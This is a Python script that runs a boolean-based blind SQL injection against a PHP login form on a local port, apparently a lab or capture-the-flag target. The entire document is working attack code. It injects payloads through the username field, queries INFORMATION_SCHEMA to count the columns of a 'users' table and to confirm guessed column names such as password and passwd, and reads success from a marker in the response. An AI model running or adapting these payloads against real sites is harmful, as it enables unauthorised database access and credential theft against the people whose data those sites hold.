import requests
import time

base_url = "http://127.0.0.1:33038/index.php"
session_cookie = {"PHPSESSID": "ucv4hujhocgopm34cbotf0aitf"}

def send_payload(payload):
    data = {
        "username": payload,
        "password": "dummy",
        "submit": "Login"
    }
    try:
        response = requests.post(base_url, data=data, cookies=session_cookie, timeout=10)
        return '{"response":"password"}' in response.text
    except:
        return None

# List columns in users table using information_schema
print("[*] Enumerating columns in 'users' table...")

# Get column count first
print("\n[*] Finding number of columns in users table...")
col_count = 0
for i in range(1, 20):
    payload = f"' or (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users')={i}-- -"
    if send_payload(payload):
        col_count = i
        print(f"[+] Users table has {i} columns (this might be across all tables named 'users')")
        break
    time.sleep(0.1)

# Get column names
print("\n[*] Extracting column names...")
column_names = []

# Try common column names
common_columns = ['id', 'username', 'password', 'email', 'name', 'role', 'user', 'pass', 'passwd', 'pwd']
for col in common_columns:
    payload = f"' or EXISTS(SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND COLUMN_NAME='{col}')-- -"
    if send_payload(payload):
        column_names.append(col)
        print(f"[+] Column found: {col}")
    time.sleep(0.1)

print(f"\n[+] Discovered columns: {column_names}")

